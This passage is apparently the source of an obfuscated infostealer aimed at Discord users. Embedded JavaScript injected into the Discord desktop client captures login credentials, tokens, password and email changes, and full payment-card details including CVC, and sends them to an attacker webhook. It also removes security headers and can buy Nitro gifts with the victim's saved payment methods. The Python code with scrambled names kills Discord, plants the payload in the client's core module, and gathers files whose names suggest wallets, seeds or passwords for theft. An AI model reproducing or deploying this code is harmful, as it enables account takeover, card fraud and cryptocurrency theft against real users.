    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def DIQJDUMSKBHDAUEQPEDTXCPPWIQWHYTBHVBGRODWFGKLOREEIDQCZNBKVYVXAHSWQESEGIWCJJKZRYFQBRPFRMMQTRCM():
    import os
    import re
    import subprocess
    import psutil

    KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG = "Active"

    def IAMSYLWHKRZIWCVUONQUOAEKCAQRNERCRABGNDEMCVZFZLBMCARDSDFIDZQYMDGBVSJXS(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD):
        for v4r_file in os.listdir(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD):
            if re.search(r'app-+?', v4r_file):
                BWMEMFBAVJNWAXUQAMBESPMUJSEGVOKFRUAUWFKXMWLPUJKDIMOUMKQNDGXDJPGIRMXYXZXOZLFMWPEPJQDOY = VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD + '\\' + v4r_file + '\\modules'
                if not os.path.exists(BWMEMFBAVJNWAXUQAMBESPMUJSEGVOKFRUAUWFKXMWLPUJKDIMOUMKQNDGXDJPGIRMXYXZXOZLFMWPEPJQDOY):
                    continue
                for v4r_file in os.listdir(BWMEMFBAVJNWAXUQAMBESPMUJSEGVOKFRUAUWFKXMWLPUJKDIMOUMKQNDGXDJPGIRMXYXZXOZLFMWPEPJQDOY):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE = BWMEMFBAVJNWAXUQAMBESPMUJSEGVOKFRUAUWFKXMWLPUJKDIMOUMKQNDGXDJPGIRMXYXZXOZLFMWPEPJQDOY + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE, v4r_file
        return None

    def OTYATMKZAILMURHOJALSLFCAQVFDMXEBCFOZLTONOLNBASFCVAGN(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD):
        PDSICEJQBXJWRPVAVLDCGEHRATXAAZQPVIHSXNAYDCUEKWBWUPTUZCURCXEKCJYFRBFAAZQTUFJPIXZADBMUFBUQZJVXGWIUGOZ = VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD + '\\Update.exe'
        LPHFHKRMSUSXTQBYKSDNLDWKKBQCINDXIRWUYCEYUINPKRIBNC = VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD):
            if re.search(r'app-+?', v4r_file):
                IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJ = VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD + '\\' + v4r_file
                if os.path.exists(IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJ + '\\' + 'modules'):
                    for v4r_file in os.listdir(IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJ):
                        if v4r_file == LPHFHKRMSUSXTQBYKSDNLDWKKBQCINDXIRWUYCEYUINPKRIBNC:
                            LPHFHKRMSUSXTQBYKSDNLDWKKBQCINDXIRWUYCEYUINPKRIBNC = IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJ + '\\' + LPHFHKRMSUSXTQBYKSDNLDWKKBQCINDXIRWUYCEYUINPKRIBNC
                            subprocess.call([PDSICEJQBXJWRPVAVLDCGEHRATXAAZQPVIHSXNAYDCUEKWBWUPTUZCURCXEKCJYFRBFAAZQTUFJPIXZADBMUFBUQZJVXGWIUGOZ, '--processStart', LPHFHKRMSUSXTQBYKSDNLDWKKBQCINDXIRWUYCEYUINPKRIBNC],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def DIPRZNNRYHRGKLAWZAUHEMXYJPJGMDPXRWYQMDMIRQBHDUFVXZDYHKTAVZYRWZNQCZOLDKZENMHNKJ():
        IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJdata = os.getenv('LOCALAPPDATA')
        MDLBYFFVVQEKWMTXCKTNOBBXJTGDUBUDKXVZSNANORJVNGPUQJKGVITOTGAWQQTXVQPFMRCBAPGXHEVKLECANIPPZPPPY = [
            IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJdata + '\\Discord',
            IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJdata + '\\DiscordCanary',
            IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJdata + '\\DiscordPTB',
            IYOEKEVZIYZZHCDDVBUHIKZSJMONHPWETRJKQMWVMEOZFWJBQZLJdata + '\\DiscordDevelopment'
        ]
        EEXEFNEXWFGIEGZAXLKKUYZHMORRBMVFOFGHWYYQULJOXGPRIYDMGIKTIJNEGGONIDGZQXZWURSLTMXDAI = GCMYOBSBCXQNTLGNQOSHJQGIXMTUZUBCYCRHZZSHGSHFGMEUPRMEQEGICGHQLHEOUBQP

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD in MDLBYFFVVQEKWMTXCKTNOBBXJTGDUBUDKXVZSNANORJVNGPUQJKGVITOTGAWQQTXVQPFMRCBAPGXHEVKLECANIPPZPPPY:
            if not os.path.exists(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD):
                continue

            ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE_info = IAMSYLWHKRZIWCVUONQUOAEKCAQRNERCRABGNDEMCVZFZLBMCARDSDFIDZQYMDGBVSJXS(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD)
            if ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE_info is not None:
                ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE, ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE_file = ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE_info
                
                TZBQUHWHPWNGJDXGVTLAEYXCCABOQBHITAAONVPLSGPPGDWDNRYNLHKEDVPRWXARBPPDNTRCHPSXXIAPGHSOZCOEKRTAWXSXLHJX = ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE + '\\index.js'
                
                if not os.path.exists(TZBQUHWHPWNGJDXGVTLAEYXCCABOQBHITAAONVPLSGPPGDWDNRYNLHKEDVPRWXARBPPDNTRCHPSXXIAPGHSOZCOEKRTAWXSXLHJX):
                    open(TZBQUHWHPWNGJDXGVTLAEYXCCABOQBHITAAONVPLSGPPGDWDNRYNLHKEDVPRWXARBPPDNTRCHPSXXIAPGHSOZCOEKRTAWXSXLHJX, 'w').close()

                with open(TZBQUHWHPWNGJDXGVTLAEYXCCABOQBHITAAONVPLSGPPGDWDNRYNLHKEDVPRWXARBPPDNTRCHPSXXIAPGHSOZCOEKRTAWXSXLHJX, 'w', encoding='utf-8') as f:
                    f.write((EEXEFNEXWFGIEGZAXLKKUYZHMORRBMVFOFGHWYYQULJOXGPRIYDMGIKTIJNEGGONIDGZQXZWURSLTMXDAI).replace('discord_desktop_core-1', ZOKJKGOGJSQZWNBJIDQXDOFGVASBRFXNXNGEHIHYCMTSGPOSSSXQOHKLYTZBJMQBKZBVGYJMXVE_file)
                            .replace(r"%WEBHOOK_HERE%", LQHEDZORDRARRIRKBYAAVWQSYMRBSWLYMBMLVVVBGOEQELSZVEATZTYJLIQNJQIUXL)
                            .replace(r"%EMBED_COLOR%", str(DQRTDBHQCBUZQXOQYPSXWFDZXURYVYQYQAEEPUTUCVMKZVHQEELYNHMUUMNXLMGWHASFHIBMXLRSYCYJXKFJIZDOUITJMVHWTEH))
                            .replace(r"%USERNAME%", YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC)
                            .replace(r"%IP_PUBLIC%", WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ)
                            .replace(r"%EMBED_NAME%", FEIASJOKUVWMEETJWPBHIRWHDNGFMSSTJRPIBIKTYNSGBBRAVR)
                            .replace(r"%EMBED_ICON%", FPGNHFYHDWZNPTRLBQAPYAHQJNHTQOOSQGEYWJPCRFGCPJHXNZACHVQHWELHEIDMKIVOIWTBBIRTAY)
                            .replace(r"%FOOTER_TEXT%", WQJVAJTCANBACODWPJVAVUTZHQVJVQQJJKELJXCOZCXVOMUVDMHARBMMACNJRTRBMSAUAFCKHZQAVYSG)
                            .replace(r"%WEBSITE%", LIMDOJJEQIKTNFNTXZXYZYUPVVJBAJMLAPRIZVNAIHPJAVYOBSZPNNGGIEEYFCWIOUSGWTKVFINDETLPGOIZDVDCG))
                OTYATMKZAILMURHOJALSLFCAQVFDMXEBCFOZLTONOLNBASFCVAGN(VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYD)
                
    DIPRZNNRYHRGKLAWZAUHEMXYJPJGMDPXRWYQMDMIRQBHDUFVXZDYHKTAVZYRWZNQCZOLDKZENMHNKJ()
    return KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG

def GJOSVXWLKTMRXULVOQZICOYLZFXGPIZOHCZHMDWJTAYJBSJYKH(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import os
    import random

    TRIWLRLBBDXRWXCILNTDLPWLKGFBUYQHUZTSFRGTABONGFYOCFXBSUYXHDAKPAEUPVDQKCTTBXUSZWHKRQE = [
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "Desktop"),
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "Downloads"),
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "Documents"),
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "Picture"),
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "Video"),
        os.path.join(BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH, "OneDrive"),
        os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Microsoft", "Windows", "Recent")
    ]

    CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUGwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN_files = []

    for GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT in TRIWLRLBBDXRWXCILNTDLPWLKGFBUYQHUZTSFRGTABONGFYOCFXBSUYXHDAKPAEUPVDQKCTTBXUSZWHKRQE:
        for v4r_root, VLQBOHQMDAFIIIDSPLKOWIKUJGTPXBCMXSBLODFICZDELGVFJQYBCXSRDVLGYDs, v4r_files in os.walk(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        EDZKJNHXTIZMALEVABCDZLPUBWCAWJYKCTYYBNBWQIGWCDLLZQGCUSTKGRGPUQO = os.path.splitext(v4r_file)[0].lower()
                        for CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUGword in CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUGwords:
                            try:
                                if CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUGword.lower() == EDZKJNHXTIZMALEVABCDZLPUBWCAWJYKCTYYBNBWQIGWCDLLZQGCUSTKGRGPUQO:
                                    BUOHMWCHJQLXDYLWKPECRJEJGBEGRCCJPCHTZQFSANRBFBLIUKFLIHK = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(BUOHMWCHJQLXDYLWKPECRJEJGBEGRCCJPCHTZQFSANRBFBLIUKFLIHK):
                                        KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(BUOHMWCHJQLXDYLWKPECRJEJGBEGRCCJPCHTZQFSANRBFBLIUKFLIHK, "rb") as v4r_f:
                                            SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN_files:
        TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA = sum(len(phrase.split()) for phrase in KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN_files)
    else:
        TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA = 0

    return TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA

def HXCEIBTRUFFFHRWXGFQEOCXBNZVDDMZCQIZTDTHJVBCCMJRXNDKGUGKVCVWAW(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import os
    import psutil

    CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS = ["Wallets", "Game Launchers", "Apps"]
